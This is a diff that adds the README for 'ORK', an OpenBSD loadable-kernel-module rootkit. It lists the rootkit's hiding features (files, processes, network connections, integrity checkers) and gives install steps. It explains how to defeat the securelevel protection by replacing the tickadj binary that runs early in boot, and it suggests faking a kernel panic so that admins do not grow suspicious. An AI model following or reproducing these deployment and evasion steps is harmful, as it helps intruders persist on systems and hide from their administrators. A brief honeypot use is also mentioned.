@@ -1,0 +1,73 @@
+ORK (Openbsd RootKit) v.0.1
+Meder Kydyraliev <meder@areopag.net>
+
+FEATURES
+~~~~~~~~
+	- hides files from admins and intergrity checkers
+	  such as tripwire, aide, etc;
+	- hides procs and blocks signals to those procs;
+	- hides TCP network connection to/from specified port;
+	- LKM itself is completely invisible;
+
+OpenBSD VERSIONS
+~~~~~~~~~~~~~~~~
+	Written and tested on OpenBSD 3.4
+
+INSTALLATION
+~~~~~~~~~~~~
+	#tar zxvf ork-0.1.tar.gz
+	#cd ork-0.1
+	<edit 'tickadj' shell script and define ORKHOME>
+
+Kernel sources are needed to compile ORK, however object file is 
+provided also (for OpenBSD 3.4 - ELF), if kernel sourceS aren't
+available skip the 'make' command below and type only:
+
+	#make install && make load
+
+If kernel sources are available and you want to recompile ORK type:
+
+	#make && make install && make load
+
+	NOTE: by default in OpenBSD LKMs cannon be loaded because
+	securitylevel is set to '1'. It cannot be set to lower value
+	and can only be raised. Unless admin was stupid enough to set
+	securitylevel to '-1' we need to find a way to load the LKM.
+	Luckily enough there is a way (there are probably a lot more
+	other ways):
+	If you look in /etc/rc.securelevel, you'll see:
+
+	if [ X"${ntpd}" == X"YES" -a -x /usr/local/sbin/tickadj \
+    	-a -e /etc/ntp.conf ]; then
+       		echo -n ' tickadj';	/usr/local/sbin/tickadj -Aq
+	fi
+
+	Which means that if ntpd value is set to 'YES' in /etc/rc.conf
+	and /usr/local/sbin/tickadj file is executable and /etc/ntp.conf
+	file exists, /usr/local/sbin/tickadj is _EXECUTED_ before security
+	level is raised. By default ntpd is set to 'YES' in /etc/rc.conf
+	So when you type 'make install' it'll create /etc/ntp.conf and copy
+	our tickadj to /usr/local/sbin with original tickadj being copied to
+	/usr/local/bin/ork_tickadj.
+
+So after you have done steps above, ORK will either be loaded (if 
+securelevel was low enough) or it will be loaded on next boot. If
+you think that simple reboot will be too suspicious you can emulate
+kernel panic with message in /var/log/messages, of course if machine
+rebooted because of kernel panic and ddb.panic was set to '1' smart
+admin could become suspicious.
+
+ORK can also be used on honeypots to hide procs, connection and files
+from kiddies.
+
+And last thing, you need to start all the processes that you want to be
+hidden _BEFORE_ you load the ORK as those files will be hidden once ORK
+is loaded. You can add your commands to 'tickadj' before the make commands.
+
+Comments, suggestions and bugreports are always welcome!!!
+
+REFERENCES:
+~~~~~~~~~~~
+
+	- great article http://www.r4k.net/mod/, many things are based on it;
+	- OpenBSD sources, the best source of info ever :) ;
